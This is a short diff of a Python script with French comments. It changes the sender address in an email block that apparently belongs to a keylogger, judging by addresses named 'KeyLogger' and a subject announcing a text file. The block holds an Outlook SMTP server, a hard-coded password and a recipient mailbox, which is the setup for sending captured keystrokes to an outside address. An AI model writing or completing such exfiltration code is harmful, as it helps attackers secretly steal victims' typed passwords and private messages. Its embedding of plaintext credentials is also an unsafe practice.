@@ -10,7 +10,7 @@ import time
 # Configuration de l'email
 smtp_server = 'smtp-mail.outlook.com'
 smtp_port = 587
-from_email = 'a4eKeyLogger@outlook.com'
+from_email = 'a5eKeyLogger@outlook.com'
 password = 'mdp?2__aazz'
 to_email = 'PlasticeaterG12@outlook.com'
 subject = 'Voici votre fichier texte'
